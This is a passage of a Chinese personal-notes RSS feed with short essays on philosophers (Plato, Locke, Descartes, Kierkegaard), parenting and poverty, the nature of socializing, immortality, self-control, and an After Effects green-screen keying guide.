娱乐圈这样的例子去年今年都有，不用我再赘述。
这就需要我们对别人对我们的期望值进行有效管理。
比较常见的手段是憋大招，有一些在对方期待之外的东西不到关键时刻不能随便拿出来用。
但周围人也不是傻瓜，次数多了，别人都会倾向于相信你藏着一手，例如学生时代那些永远叫嚷着这次考砸了的第一名们，
信誉早已破产，其他人对其期望值仍然在持续上升，这时候承受的压力可想而知。
要真正做到有效控制周围人对你的期望值，需要做到真正无迹可寻，并在所有非必要的时刻压抑自己的表现欲与虚荣心。</description>
    </item>
    
    <item>
      <title>柏拉图</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E6%9F%8F%E6%8B%89%E5%9B%BE/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E6%9F%8F%E6%8B%89%E5%9B%BE/</guid>
      <description>柏拉图 永远的真善美 尽管世间所有事物都是 “流动” 的，但一定仍有 ” 某些东西&amp;quot; 永远不会改变（如原子）。
每一个人都不一样，有的少了腿，有的少了手，有的鼻子高，有的脸大，但我们还是能准确的分辨出这些都是“人”，柏拉图认为，这是因为在人类的背后，存在着一个形式：理型人。
物质世界的背后，存在一个 ：理型的世界，这个世界中包含存在于自然界中各种事物的 “永恒不变的形式”，这种观点叫做 “柏拉图的理型论”。
感官和理智 感官：彩虹里哪一种颜色最漂亮、你最喜欢吃什么菜？询问这类问题你大概率会得到许多不同的答案。
理智：9 × 5 的结果、三角形的内角和，诸如此类的问题你大概只会得到一种答案。
不朽的灵魂 感官以身体为基础，因此身体是不可靠的；理性是以灵魂为基础，由于灵魂不是物质，因此它是可靠的，灵魂可以探索理型的世界。
灵魂栖居在某个躯体之前，原本就已经存在；一旦灵魂在某一躯体内醒来时，它便忘却了理型的世界，紧接着，一个人类诞生了，随着时间的推移，这个人的灵魂渴望回“家”，渴望从“肉体的枷锁中挣脱”，它渴望死亡，渴望回到理型的世界。
物质世界是精神世界的一个映射，有的人却一生都沉沦在物质世界中，从不去探究这个美妙的精神世界。
哲学之国 国家应该由理性来统治。
人体由三部分组成：理性属于头部；意志属于胸部；欲望属于腹部。
理性追求智慧，意志追求勇气，欲望则必须加以阻遏，并且做到自制，才能使人体达到“和谐”的境界。
黑暗洞穴 我们身处的大自然，虽然不是黑暗或无趣的，但它比起鲜明清楚的理型世界，就显得黑暗而平淡。</description>
    </item>
    
    <item>
      <title>永生是酷刑</title>
      <link>https://note.yxzi.xyz/note/view/thinking/%E6%B0%B8%E7%94%9F%E6%98%AF%E9%85%B7%E5%88%91/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/thinking/%E6%B0%B8%E7%94%9F%E6%98%AF%E9%85%B7%E5%88%91/</guid>
      <description>永生是酷刑 不要用非永生的大脑，去思考永生后的烦恼。
你看蝙蝠，目不能视，近乎于盲，何其可怜；
蝙蝠看你，不闻超波，近乎于聋，何其不幸。
你看燕雀，孱孱弱体寄人篱下，一根竹竿宰其生死；
燕雀看你，体胖臃肿不能翱翔，徘徊地面哪得自由。
你看猫狗，生命区区十余载，每日受困屋房中，只是人类一玩伴；
猫狗看你，终日奔波不得闲，喂食铲屎不敢忘，只是喵汪一奴仆。
生命的意义是时间的尺度决定的。
在只能活三个季的蚱蜢眼里，秋季就是生命的尽头，后面是地狱般的寒冬，活着定是无尽的痛苦。
在只能活一天的蜉蝣眼里，池塘之大就是彼之沧海，朝生暮死，不知晦朔，世间值得已全部看尽。
五岁的孩童哭闹，因为错过了 30 分钟的动画，对他来说，那是他生命中有意义的 30 分钟。
十七岁的少女苦恼，因为错付了 30 天的爱情，对她来说，那是她生命中有意义的 30 天。
三十岁的中年人忧虑，因为错失了 30 月的工作，对他来说，那是她生命中有意义的 30 月。
五十岁的知命烦懑，因为蹉跎了 30 年的韶华，对他来说，那是他生命中有意义的 30 年。
八十岁的耄耋懊恼，只因为今日大风，没能如往常一样坐于廊前，看天空云卷云舒，看庭前花开花落，咀嚼岁月如常，
对她来说，用生命品味时间就很有意义。
我们觉得永生是酷刑，因为思考这个问题的，是非永生的大脑。
我们很难设想以亿万年计的生命要去思考什么，见证什么，尝试什么，
他们做事意义在哪里，带来的收获是什么，感动和喜悦的又是什么。
只有当生命真到了这个维度，我们可能才会逐渐寻找新的愉悦和感动。
可能是发出一束光，等待 4.24 年看到另一个星系的回应，那是人马座的时间。
可能是洒下一片生命种子，过 35 亿年看看会进化出什么生物，那是生命的时间。
可能是见证一个瞬间，用 140 亿年看看万物从无到有，从坍塌到膨胀，那是宇宙的时间。
总之，用有限生命的头脑，可能无法设想永生生物的快乐。
就像处男做春梦，到了关键时刻总是编不下去醒来的。
有的人说这是不是已经脱离现实上升到哲学的论述了。
其实，思维是指导行为的。
小时候曾经有过一次，因上课不听话被老师叫到走廊罚站了整日。
到了晚上奶奶来接我，我说今日站在走廊经历同学走过议论，太丢脸了，不想再去学校了。
奶奶笑着告诉我，现在我看是天大的事情，但等长大一些，今天不过是记忆中的一件小事罢了。
“永生是否是一种酷刑”，很像现代年轻人偶尔会陷入的悲观焦虑。
有时候一件小事，在当时看来，是足以毁灭自己的，让你感觉前途没了光明。
其实，等你走到未来，发现还有无限可能。
前几天安慰一位妈妈，她说知道不对，但放不下对孩子每次考试成绩的焦虑。
我劝她不妨试着将目标放大，将结果放小去看，或许有用。
目标放大，想象孩子 25 岁成年工作、结婚的样子。
孩子的这一次考试还是否还那么重要？
结果放小，体会你与孩子的每一次学习、玩耍的瞬间，他是不是努力、快乐、感到幸福？
如果你也有不开心的时候，感觉生命无法迈过的时刻，不妨也想象在更长的时间里，在宇宙的维度下，这烦恼不过是一瞬的烟云。
认真把握每个精彩的时刻，过好每一个陪伴亲人的瞬间。
不要为没发生的事情而烦恼。
不悔既往，不负当下，不惧未来
宇宙的安排都是完美的。</description>
    </item>
    
    <item>
      <title>洛克</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E6%B4%9B%E5%85%8B/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E6%B4%9B%E5%85%8B/</guid>
      <description>洛克 一个事物，在某些性质（重量、形状）上，每个人都会有一致的看法，因为这些性质存在于事物本身之内。但还有一些性质（颜色、味道），就可能因人而异了，因为每个人的感觉是不一样的。</description>
    </item>
    
    <item>
      <title>父母哭穷的行为</title>
      <link>https://note.yxzi.xyz/note/view/society/%E7%88%B6%E6%AF%8D%E5%93%AD%E7%A9%B7%E7%9A%84%E8%A1%8C%E4%B8%BA/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/society/%E7%88%B6%E6%AF%8D%E5%93%AD%E7%A9%B7%E7%9A%84%E8%A1%8C%E4%B8%BA/</guid>
      <description>父母哭穷的行为 可怕的不是真穷，可怕的是不知道有多穷的压迫感和未知感。
你家要是真穷的话，父母早早对你说清楚，你看，咱家一个月收入就 3000，
一千交房租，一千五吃饭，存 300 应急，每个月只能给你 200 当午饭钱。
你会怎么办？
你但凡超过八岁，会算不过来这个帐吗？会不懂有多少钱才能花多少钱这个道理吗？
你只要智力正常,情感正常，都会知道再闹着向父母要钱一点用都没有，
一来因为钱就这么多，二来因为你也知道自己是家里的一份子。
你会因为只有 200 块午饭钱自卑吗？有可能会，但这不会困扰你太久。
当你认识到现实之后，你会意识到自卑也什么用都没有，还不如好好想办法怎么把这 200 块花到刀刃上,
甚至开源节流自己想办法赚些钱铺贴家用。
但为什么你还是会痛苦，是因为你不知道自己父母的真实意图是什么。
可能你会发现与父母收入差不多的同事家的孩子有新衣服穿，你却只能穿旧衣服。
你发现当自己想要一个什么东西的时候，父母总是说没钱，但是转头他们又支出了大笔非必要的开销。
当你向父母索取任何东西的时候，你的父母总是说家里穷，你再向父母提过多要求就是道德败坏。
但是在生活中你却发现，你家其实又没有你父母说的那么穷。
你所体会到的是罪恶感，是无所适从。
真穷的人花钱才不会有罪恶感，因为真穷的人花钱都是计划好了的。
计划好了的支出怎么会有罪恶感? 只会有攒了好久钱终于吃了一顿饺子的喜悦。
只有不知道自己到底是穷是福的人花起钱来才有罪恶感。
你很想吃饺子，却又思前想后不知道这顿饺子的开销对于家庭和自己的财物状况来说到底意味着什么。
你咬紧牙关下定决心买了饺子，吃完了就开始担忧是不是这次放纵就能把自己家吃破产。只有在这种情况下，花钱才有罪恶感。
这是很愚蠢的行为。
在这种环境中长大的孩子，要么一辈子畏畏缩缩，一辈子都无法体会到物质给人带来的便利和愉悦。
要么在有了点钱之后就会挥霍无度，希望通过花钱来对抗自己的自卑情绪。
但这却是很有效的行为，你的父母总对你哭穷，那么当你向父母索取任何东西的时候，
你自己都会承担非常大的心理压力。这样你的父母就可以节省掉很多抚养成本，还能向别人炫耀自己家的孩子懂事儿，从来不乱要东西。
因为这个方法真的很有效，所以在中国父母间广泛流传。
这个方法的核心秘诀在于，大多数向子女哭穷的中国父母，并不是面向解决问题的。
比方说你想要一双一千块的新鞋，如果你的父母对你说，咱们家的经济状况不好，
所以每个月只能给你 200 块午餐钱，如果你每个月能省 100 块出来，
那攒 10 个月你就能买这双鞋了，或者你可以去麦当劳打工，一个小时十几块，攒上三个月你就有钱买这双鞋了。
你要考虑以下自己是不是要为了一双鞋就付出这么多努力，或者买双便宜一点的也可以。
这叫面向解决问题。智力和情感正常的子女都会自己做选择。
实际上这些父母会说，我们这么辛辛苦苦挣钱省钱，每分钱赚的都不容易，你居然还要买一千块的鞋。
你怎么这么不知道体谅父母，你这是不孝，是道德败坏。
当诉诸道德的时候，问题本身就不重要了，而因为在面对未成年子女的时候，
父母天生就占据了权力高位，对道德问题拥有绝对解释权，所以父母可以不需要解决任何实际问题。
作为还无法自立的子女，你会困惑，会不知道到底该怎么办，会认为真的是自己的错。
这时，父母的目的就达到了，父母不仅省了钱，还占据了道德制高点。
在很多中国家庭中，父母和子女是不能讨论任何具体的问题的。
因为讨论具体问题意味着子女有权力提出自己的想法。
但是很多中国父母是不能容忍这一点的，在很多中国父母的眼中，自己必须掌握对子女的绝对权力。
这些中国父母必须掌握道德的制高点，因为只有掌握了道德的制高点，父母才有对一切问题的解释权。
说家里穷，父母赚钱不容易，是掌握道德制高点非常重要的手段。
至于家庭的实际情况和你的具体问题是什么，并不重要。
因为父母的目的是掌握了道德制高点之后让你听话，而不是帮助你解决具体问题。
生在这样的家庭，你的前半生必然痛苦。物质的匮乏是次要的，对你影响更大的会是世界观和价值观的扭曲。
这些心理上的阴影必然会伴随你半生，会给你的学业，事业和家庭生活带来极大的负面影响。
你的父母 shi 不会在乎这些的，因为他们的目的是让你听话，你的问题是你的问题。
你甚至非常有可能一辈子都意识不到自己的问题所在，浑浑噩噩的也就过去了。
只有当你有了足够的经历和思考之后，你才有可能从这个阴影里走出来。</description>
    </item>
    
    <item>
      <title>知识诅咒</title>
      <link>https://note.yxzi.xyz/note/view/thinking/%E7%9F%A5%E8%AF%86%E8%AF%85%E5%92%92/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/thinking/%E7%9F%A5%E8%AF%86%E8%AF%85%E5%92%92/</guid>
      <description>知识诅咒 知识的诅咒，简单来说就是你知道一件事物后，你就无法想象你不知道它。
而当你想把你知道的知识解释给别人的时候，因为信息的不平衡，
你很难把自己知道的完完全全给对方解释清楚，感觉就是我们被知识“诅咒”了。
对某个问题，自从知道了，就再也无法设身处地从未知者角度思考它。</description>
    </item>
    
    <item>
      <title>社交的本质</title>
      <link>https://note.yxzi.xyz/note/view/gam/%E7%A4%BE%E4%BA%A4%E7%9A%84%E6%9C%AC%E8%B4%A8/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/gam/%E7%A4%BE%E4%BA%A4%E7%9A%84%E6%9C%AC%E8%B4%A8/</guid>
      <description>社交的本质 我想用这一篇文章阐明社交的本质，从而在根本上终结所有的社交问题。
这篇文章一共七千多字，写到最后的时候我有一种预感，这篇文章可能会改变很多人的一生。
社交在本质上分为两种。
一种是**「共情社交」，一种是「功利社交」**。
共情社交 共情社交是指为了获得情感联结与情感体验，打发无聊，或是有共同的兴趣等而产生的社交行为。
这种社交不涉及利益的交换，且绝大多数人自小产生的社交行为都是源于这种共情类的需求。
随着一个人年龄的增长，他的共情社交会逐渐的减少；
并且在同一年龄与阶层中，一个人的心智越成熟、能力越强、社会地位越高，他的共情社交就会越少。
这就是为什么很多人会觉得越长大越孤单，越长大朋友越少，越长大越难和别人交心；
还有为什么两个原本社会地位一样的人，其中一个发达了之后就会疏远另一个的原因。
共情社交存在的根本原因是在于：当一个人的心智尚未成熟独立时，或是当他社会阶层较低、生活不如意时，
他需要从朋友那里获得情感上的联结和支持。
在生活中那些越成熟、越独立的人就越是对共情社交不在乎。
因为他们的人格和在社会上生存的能力足够完善，无论是情感还是物质，他们都不需要“朋友”来给他们提供支持。
那么有些人可能会说了，那还有一些明明心智很成熟、也很热爱社交的“交际花”，这又如何解释呢？
那是因为，那些交际花要么只是单纯地喜欢「和很多人一起玩」这件事而已，就和一个人喜欢骑马、喜欢打球一样。
他就算不和这群人玩，和另一群人一起嗨也是一样。
即便他长期的喜欢和某一群人一起玩，那也是因为就像你骑马时特别喜欢某一匹，打球时某一球拍用的最顺手，仅此而已。
只不过是当面向的对象变成人时，也多多少少的会被掺杂上一些情感的因素。
要么是他建立这么多的社交关系只是为了筛选出足够有价值的「功利社交」的对象，
他在做的事情只是依托着“社交”这一表象进行互利伙伴的挑选与关系建立罢了。
人与人交往的本质是利益交换
利益分为物质利益和精神利益，很多人其实就是没有认识到“精神利益”其实是“利益”的组成部分。
人类社会就是通过各种利益交换凝聚起来的，“感情”本身就是“利益”的一部分。
利益交换并不只限于物质对物质，精神对精神。精神利益与物质利益的互换是最常见的事情。
“钱”就是沟通精神利益与物质利益的重要纽带。
比如：
 亲子关系：也许在有些人看来，“亲子关系”不会涉及到利益。但实际上，亲子关系是很典型的精神利益与物质利益的互换。 施舍行为：施予者获得的是精神上的愉悦，受助者获得的是物质上的帮助 + 精神上的愉悦。只要双方都是自愿，这就是个互利双赢的事。 文艺演出：看演出的人得不到任何物质利益，但依然愿意花钱买票。这就是精神利益的价值体现。  所以说“人与人交往的本质是利益交换”是一种很合理的说法。
不要认为理智会伤害感情，实际上只有以理智为前提，才能拿捏好各种感情的分寸，让大家都过得开心。
功利社交 功利社交是指为了达成某一目的，或是从对方身上获得利益而产生的社交行为。**
这种功利性社交在小孩子一开始挑选玩伴的时候就已经产生了：
比如在班级里面大家都倾向于和零食最多、玩具最多的小孩做朋友；
我们都喜欢和不会欺负我们、不会抢我们东西的人一块玩；
如果你的干脆面每天都分给一个小朋友一半而他却从来不分给你，那你最后会放弃这个朋友；
随着一个人心智的完善和社会地位的提升，他会越来越注重社交的「效益性」。
即一段社交关系能带给他怎样的利益，和这个朋友继续交往有没有价值，甚至是和一群老朋友一起吃饭还有没有必要。
「功利社交」有两个基本前提：
有效信息的交互传递 这个信息是广义的，在人际交往中的如语言、情感、物质、知识等都可以包括在这个信息的范畴内。
沟通的本质就是信息的传递。
而有效是功利性社交的一个基本要素。人们产生功利社交行为之前基本上都是抱有一定的目的性的，
当我和你产生社交时，我们的交流应该是有价值的，而不是毫无意义的闲扯和浪费时间的各说各话。
一个最起码的前提是，我们能够理解双方所表达的意思。
你和一个没玩过 LOL 的人谈论补刀和打野技巧，和一个不懂金融的人谈股票，
你给一个廉洁公正的领导送礼希望提拔你，那么这样的“沟通”就是无意义的。
较为对等的价值水平 这个价值水平并不仅仅只是指社会地位。它依据的是具体情况和个人的评判标准。
比如你是个百万富翁，你最喜欢看别人翻跟头，那么一个翻得一手好跟头的乞丐或是白领或是小商贩对你而言都是有价值的。
那如果这个翻得一手好跟头的人也同时渴望一个有钱的朋友，那你们的价值水平就算是“对等”的。
而如果这个翻得一手好跟头的人视金钱如粪土，他只喜欢会踩高跷的朋友，
那你这个百万富翁对他而言就是无意义的，你们的价值水平就并不对等。
功利性社交的根本目的就是能够从对方那里获得一定的利益或是得到帮助，
如果一个人和你的差距极大，你很清楚这个人在未来的生活中不可能给你带来丝毫的利益，
那么这段社交关系对于你而言就是无价值的，所以你本能的就会舍弃。
一个人的心智成熟到一定程度后，他对共情社交的需求会下降到几乎为零。
旧的社交关系只有在两个人还能够产生有效交流的前提下才能继续维持。
大多数情况是：
你的那些比你强的朋友在默默地舍弃了你，而你也悄悄地舍弃了那些比你弱的朋友。</description>
    </item>
    
    <item>
      <title>祁克果</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E7%A5%81%E5%85%8B%E6%9E%9C/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E7%A5%81%E5%85%8B%E6%9E%9C/</guid>
      <description>祁克果 与其寻找那唯一的真理，不如去寻找那些对个人声明具有意义的真理。</description>
    </item>
    
    <item>
      <title>穷人为什么要生孩子</title>
      <link>https://note.yxzi.xyz/note/view/society/%E7%A9%B7%E4%BA%BA%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%9F%E5%AD%A9%E5%AD%90/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/society/%E7%A9%B7%E4%BA%BA%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%9F%E5%AD%A9%E5%AD%90/</guid>
      <description>穷人为什么要生孩子 明明很多父母连一个最基本的经济条件都给不了孩子，比如没有房，没有车，甚至没有稳定的工作，但他们依旧会决定生孩子。
我觉得这是非常不理智的行为，因为明明两个人都无法做到维持一个良好的生活水准，更别提三个甚至四个，
彩票心理 你去贫穷落后一点的农村去体验一下生活、观察对比一下就知道了，因为他们生的并不是“孩子”，而是在买一张彩票。
这一张彩票会随机开出：低成本的劳动力/没人要的箩底橙/换嫁妆的好货色/草窝生的金凤凰/没心肝的亏本货/憨厚的养老保险/……
这一张彩票的成本说低不低，起码得十月怀胎，不过一旦开出好的一注，收益率就会很高。
特别是每一个人买彩票都会觉得自己能中五百万，这是人之常情，
对于精神层面与物质层面越贫乏的人来说，他们对于这种“一注赌票、一飞冲天”的渴求就更高。
尤其是这一份彩票的投资还可以经过“人力”来控制：
对于底子不好的，一眼就知道她是箩底橙，只需要给最低的资源，尝试将她转化成“低成本的劳动力”；
或者干脆将 Ta 抛了，不要计较沉没成本，还能继续搏下一注。
对于底子好的，可以多给一些资源，培养成换嫁妆的好货色，这就是稳赚不赔了。
草窝生的金凤凰是 500 万，贪心不得，不过憨厚的养老保险好弄。
尤其是当整个社会都处于被封建儒教的规矩桎梏的环境下，更是有着地利人和的培养条件。
古代人物质条件那么差为什么还愿意生孩子？其实现在也有很多人愿意生孩子，只不过你看不到罢了。
为什么有钱的国家生育率都很低？因为他们的人终于意识到了自己是在生孩子，而不是买彩票。
当然有一点是很重要的，必须要提出来，姑且称之为“大事惯性问题”。
就是说大部分古代人其实既没有思考、也没有选择，只能随波逐流，伴随着一种“大家都在生，我也要生”的状况。
这其实就是时代因素影响的一个体现了，这当然是非常重要的。
最后再解释一下，因为“彩票心理”看起来有些冰冷阴沉，而且原文本比较简单、不够严谨，所以会容易产生误解，
以为我是在愤世骇俗，批判“孝”文化、批判亲情什么的。
这里想要说一下的，我并不批判“孝”文化，并不批判亲情，并不批判生儿育女。
繁衍后代是所有生物与生俱来必然需要遵守的自然规律，没有繁衍后代功能的，
要么是永生不死的神灵，要么已经消失在这个世界了，我自然不会批判繁衍后代。
我认为人生而平等。一对父母，生下了一下孩子，无论 TA 是男的、女的，应该平等对待。
你生了 TA 下来，不该把 TA 当成商品/牲口/彩票/……而是应该把 TA 当成人，那么 TA 才会、才应该报答你，孝敬你。
否则，这对孩子来说不公平。我想说的是，现在有很多人都没有意识到这样的问题，
也有很多人自己已经处于这样的环境中，却以为这是“理所当然、天经地道”的，事实上并非如此。
我们都需要思考，如果你有能力，可以尝试改变。
其实如果是一直在城市里生活长大的，我认为真的可以去一些稍微贫穷、落后一些的郊区啊、农村啊之类的地方去看一下，
这对于认识世界真的很有好处。
投入少，回报多 首先确定一个问题，贫困家庭即使一个不生，也改变不了贫困家庭的处境。
然后，多生几个孩子，如果单纯把孩子养活拉扯大，
其实对于贫困家庭来说还是能办到的，无非一天两顿饭，东拼西凑凑几套衣服。
老大穿好了传老二老三老四最后打补丁继续用。
我们现在觉得孩子养大是很大的负担因为考虑的太多，从怀孕开始，甚至孕前，
做一系列检查，生产后还要定期检查，打疫苗，买进口奶粉，辅食，营养品；
一次性纸尿布，衣服，儿童用的洗发精，肥皂，牙膏牙刷，玩具等等。
长大一点了要投入补课，兴趣班甚至花几十万去弄个好学校或者买套学区房；
而这些，对于只想把一个人养大，可以说是通通不需要。
说不好听的，一个小孩子饭量还不如一条大狗，等孩子的饭量超过一条大狗了，也基本能当劳力用了。
等到自己老的干不动活，也有孩子给自己提供吃喝，完美。
孩子大一点要读书了，有义务教育，再大一点如果运气好考进大学了，家里有钱就凑凑，没钱就不让去读了，很正常。
或者初中毕业就不让读书了，也差不多能当大半个劳力了。
平时省一口，养个十几年，能给家里多一个可以用几十年的壮劳力，这个买卖是很划算的。
所以为什么重男轻女，这是其中之一，对他们来说女的是赔钱货，要负责养活大，大了什么都捞不到，因为要嫁人。
而且这样家庭长大的孩子还特别容易感恩，贫困家庭意味着没有存款，没什么家当，
也就意味着父母老去之后是没办法自己给自己养老的。
所以父母从小灌输一个思想，我们那么不容易还拉扯你们长大，你们长大了可要对我们好。
孩子从小感受到的也是这个，因为从小耳闻目染看到的一切都是一个字：穷。
父母在那么穷的情况下，还能把我拉扯大，父母多不容易，加上父母从小到大不断的洗脑，
所以我长大了要对父母好，我将来赚钱了要先给他们花。
凤凰男，扶地魔不就是这么来的嘛。
你跟他们讲道理，没道理讲的，因为他们觉得孝敬父母，给家人好处就是天经地义的真理，</description>
    </item>
    
    <item>
      <title>笛卡尔</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E7%AC%9B%E5%8D%A1%E5%B0%94/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E7%AC%9B%E5%8D%A1%E5%B0%94/</guid>
      <description>笛卡尔 我思故我在 在他开始构建终究的哲学体系之前，必须先挣脱前人理论的影响。
他怀疑每一件事，而这正是他唯一能够确定的事情——有一件事情必定是真实的，那就是他怀疑。当他怀疑时，它必然是在思考，而由于他在思考，那么他必定是个会思考的存在者。
如果世上没有所谓的完美实体，我们也不会具有完美实体的概念。因为我们本身是不完美的，所以完美的概念不可能来自于我们（一个本身并不完美的人）。
一个概念的存在，那么这个概念的实体也必定存在，否则这个概念就不存在。
二元论者，他认为灵魂和物质（扩延）是分别独立的，其中物质是可以被分解的，但灵魂却不能被分解。</description>
    </item>
    
    <item>
      <title>绿幕抠像</title>
      <link>https://note.yxzi.xyz/note/technology/software/after-effects/%E7%BB%BF%E5%B9%95%E6%8A%A0%E5%83%8F/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/software/after-effects/%E7%BB%BF%E5%B9%95%E6%8A%A0%E5%83%8F/</guid>
      <description>绿幕抠像  导入图像。 新建合成——右击图层中的图像——效果——Keying——Keylight(1.2)。 Screen Color——吸管——点击图像中的绿色部分——关闭切换透明网格。 View——下拉框 Screen-Matte——增加 Screen Gain。 Screen-Matte——调整 Clip black/Clip White（使图像中的黑色和白色更加纯粹）。 View——下拉框 Final Result。 消除图像边缘的锯齿。 右击图层中的图像——效果——遮罩——简单阻塞工具——调整阻塞遮罩（使图像边缘的锯齿消除）。  </description>
    </item>
    
    <item>
      <title>自控力</title>
      <link>https://note.yxzi.xyz/note/view/grow/%E5%85%B3%E4%BA%8E%E8%87%AA%E6%8E%A7%E5%8A%9B/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/grow/%E5%85%B3%E4%BA%8E%E8%87%AA%E6%8E%A7%E5%8A%9B/</guid>
      <description>关于自控力 很多人觉得自己计划完不成，拖延，生活中养成种种恶习的根源在于自制力不强，
以为增强了自制力，一切问题就能迎刃而解——这个想法是错的，自制力并不是解决这些问题的关键。
自控力的假象与真相 不知道大家有没有这样一种感觉：
高考前是自己学习力和自控力的巅峰，那时候每天都要做好多题，学到很晚，但第二天还是精神抖擞，继续奋战；
上了大学之后，时间宽裕了，反而变得懒散了，没有之前学习的劲头和毅力了，
到了假期更是懒得一发不可收拾，熬夜看剧、晚睡晚起、暴饮暴食那都是家常便饭。
为什么会这样呢？难道时间越宽裕，自控力就越薄弱？这显然不科学。
那就是因为时间越宽裕，我们越容易懈怠和堕落？但这是结果，并不是原因。
我们以为自己的自控力曾经很强，上大学后变弱了，放假后则因为懈怠愈发孱弱——这其实这个假象。那真相是什么？
因为保证我们高效运转的其实是习惯，而不是自控力。
想想在高考之前的那种紧张的学习氛围里，我们被动的养成了很多习惯：
每天规律的上课、自习、吃饭和睡觉，我们目标明确——每个月、每个星期乃至每天复习什么，老师们都替我们安排好了。
这些我们习以为常，就像你每天早上起床都会自动去刷牙一样自然。
你想想想你起床后刷牙的过程：穿衣服（好吧我知道有人不穿），拿起杯子和牙刷，走到卫生间，接水，挤牙膏，开始刷。
即使你可能还睡眼惺忪，但这一套流程你仍然能精确无比、毫不费力的执行下来。
这个过程需要一丢丢的自控力吗？基本不需要对不对？
所以高中的那些学习，其实并不需要太多自控力。
而当你进了大学，课程安排变得自由了，你丧失了那些被动习惯，开始自己规划学习和生活时，才是需要自控力的时候。
而此时，很多人不得不面对第二个真相：
人的自控力是有限的 自控力和肌肉力量一样是有限的。
这个结论被大量的心理学实验证明，大家上网搜索一下就能看到，我这里不做赘述，
我只打个比方，相信能帮你更好的理解这个结论：
想象下，当你搬宿舍、或是换教室时，你把一摞又一摞沉重的书本，吃力的从这个屋子搬到那个屋子之后，
你双臂酸软，腰酸背疼，严重者可能连一杯水都举不起来，这是因为你的肌肉力量耗尽了。
自控力也一样，我们在日常生活中要面对各种各样的诱惑：
桌上昨天新买的一大堆零食，双十一淘宝主页玲琅满目的商品，男神胡歌的新剧又开播了……
我们要反复抵抗这些诱惑才能专注于那些重要的目标——比如学习和减肥。
每拒绝一次诱惑，你的自制力就消耗一分，如果面临的诱惑太多，
总会有一个时刻，我们会累到无力抵抗，任由暴饮暴食、刷爆淘宝、熬夜看剧这些行为支配我们的生活。
当然现实没有那么可怕，肌肉酸痛过两天会恢复，自制力嘛，你睡个好觉也能回归正常。
有意思的是，不同人天生力气不一样，自制力强弱也不一样，
自制力超群或是弱到掉渣的，在人群中都占很小的比例，大多数人都处在中间那个状态——不好也不坏。
所以我们得出的结论是：学霸就是那群天生自制力超群的人？如果是这样，那这篇文章也太没意思了。
有机智的童鞋马上反应过来了：
哦！既然我们可以锻炼肌肉，自制力也是可以锻炼的，对吧！我们只要把自制力锻炼到很强就可以了！
这话没错，然而肌肉力量有极限，自制力也是有极限的。
生活中，我们面临的诱惑如此之多，靠后天锻炼出来的自制力依然会不够用。
另一方面：
无论是校园里的“学霸”，还是社会里的精英人士，其高效的学习和生活，
并不像我们往常以为的那样，依赖于强大的自制力，而是得益于后天构建起来的习惯体系。
如何利用我们有限的自制力，去构建这样一套体系，才是这篇文章最想说的东西。
但是构建习惯体系，并不是一件轻松的事情，原因有两个：
1.很多人没有意识到，有一个看不见的敌人在阻挠我们的行动，
2.很多人不知道，习惯背后的原理。
看不见的敌人 很多人都想要减肥，想要健身，但大多数人的状况是：
决定要减肥或健身后，制定了详细的计划，买了一堆装备，办了几千块的健身卡，却在去了不到三次后，将这些东西都束之高阁。
为什么建立一个锻炼的习惯这么难呢？因为太多人不了解习惯背后的原理，更重要的原因是：
太多人太急了，太想在短期内看到显著的改变。
是的，我们都希望一夜暴富，一朝成名。
都喜欢看“穷小子白手起家创业成功，一年变身亿万富翁”，
“胖女孩半年瘦身八十斤俘获男神芳心”的故事。但这些不是我们的错，
我们之所以天生短视，喜欢即时的反馈和满足感，是因为大脑里，住着一个看不见的敌人在捣乱。
首先你得意识到它的存在，然后才能战胜它。
在几百万年前，我们的祖先还茹毛饮血的时候，资源稀缺，吃了上顿没下顿，大脑需要持续的分泌化学物质，
它们促使人们去寻找并摄入食物，热量越高越好，把自身的脂肪储存的越多越好；如果不是这种机制，人类很可能存活不到今天。
可我们不是原始人，我们进化出了更高级的控制单元，
所以我们学会了计划，学会了为达成长期目标放弃短期利益。
但原始的那部分大脑并没有消亡，它依然在时刻争夺着身体的控制权，促使我们孜孜不倦的寻求即时的满足感。
所以你明白了吗？为什么在认真学习时，忽然会冒出“学这么久了，看一集美剧吧！”的念头；
为什么晚饭吃了不少，睡前还是管不住自己伸向零食的手；
为什么你打开手机想要背单词，却鬼使神差的戳开了微博；
这些的本质都是原始大脑在作怪。
